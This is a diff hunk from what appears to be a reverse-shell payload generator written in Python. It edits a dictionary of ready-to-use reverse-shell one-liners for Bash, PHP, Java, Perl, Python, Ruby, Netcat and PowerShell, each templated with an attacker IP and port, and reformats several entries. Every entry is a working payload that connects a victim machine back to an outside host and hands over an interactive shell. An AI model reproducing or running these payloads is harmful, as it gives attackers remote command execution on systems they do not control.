@@ -34,12 +34,12 @@ current_input = ""
 SHELLS = {
     "Bash": f'/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1',
     "PHP": f'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
-    "Java": f'r=Runtime.getRuntime()\np=r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat<&5|while read line;do $line 2>&5 >&5;done"] as String[])\np.waitFor()',
-    "Perl": f'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh","-i");}};\'',
-    "Python": f'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];p=subprocess.call(["/bin/sh","-i"]);\'',
+    "Java": f'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT}; cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])\np.waitFor()',
+    "Perl": f'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
+    "Python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
     "Ruby": f'ruby -rsocket -e \'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
     "Netcat": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f',
-    "PowerShell": f'$sm=(New-Object Net.Sockets.TCPClient("{IP}",{PORT})).GetStream();[byte[]]$b=0..255|%{{0}};while(($i=$sm.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$s=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($s,0,$s.Length)}}'
+    "PowerShell": f'$sm=(New-Object Net.Sockets.TCPClient("{IP}",{PORT})).GetStream();[byte[]]$bt=0..255|%{{0}};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}}',
 }
 
 
